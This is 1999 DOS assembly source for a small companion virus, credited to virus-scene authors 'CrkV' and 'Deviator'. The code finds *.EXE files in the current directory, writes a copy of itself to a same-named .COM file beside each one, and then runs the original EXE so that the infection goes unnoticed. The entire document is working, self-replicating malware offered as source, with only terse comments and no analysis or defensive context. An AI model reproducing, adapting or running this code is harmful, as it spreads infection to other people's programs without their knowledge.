   ;Comp.100 (c) 1999 by CrkV
   ;Comp.98  (c) 1999 by CrkV+Deviator ;)

   Model Tiny
   .code
   .386
       Org 100h
   Comp:   db  '*.EXE'     ;Sub Ch,[Adr], Inc Bp

       dw  00h     ;CmdLine for function 4Bh Int 21h
       dw  80h
       db  00h

       Mov Bh,10h      ;Bl=00h
       Mov Dx,Bx       ;Dx:=1000h (New DTA)

       Mov Ah,1Ah
       Int 21h     ;Set DTA

       Mov Ah,4Ah
       Int 21h     ;Set Memory Block (Es=PSP, Bx=1000h)
       Mov Ah,4Eh      ;Find First File
   FindFile:
   WriteFile:
       Mov Di,101Eh
       Mov Dx,Si       ;Dx:=100h
       Int 21h     ;Find File (Write File)
       Jnc Ok
   Exit:   Mov Es,Ds:[2Ch] ;PSP:2Ch - Segment DOS enviroment
       Xor Di,Di
       Mov Ax,4B00h
       Mov Ch,0FFh
   NotWord0:
       Repne   Scasb       ;Cmp Al,Es:[Di],Di:=Di+1
       Scasb
       Jne NotWord0
       CmpSW           ; Skip zeros and our '*.'
       Mov Dx,Di
       Repne   ScaSB       ; Find zero
       Sub Di,04h
       MovSW           ; Copy 'EXE'
       MovSB
       Mov Bx,Si
       Mov Ds:[Bx+4],Cs
       Push    Es Ds
       Pop Es Ds       ; Exec
       Int 21h
       Ret

   OK: Mov Dx,Di
       Mov Ax,5B00h+'.'
   repne   ScaSB               ; Al='.'
       Mov DWord Ptr [Di],'moc'    ; Com
       mov     cx,si
       Int 21h
       Xchg    Bx,Ax
       Mov Ah,4Fh          ; Find next file if error
       Jc  FindFile
       Mov Ah,40h
       Jmp WriteFile       ; Write if no error
       End Comp
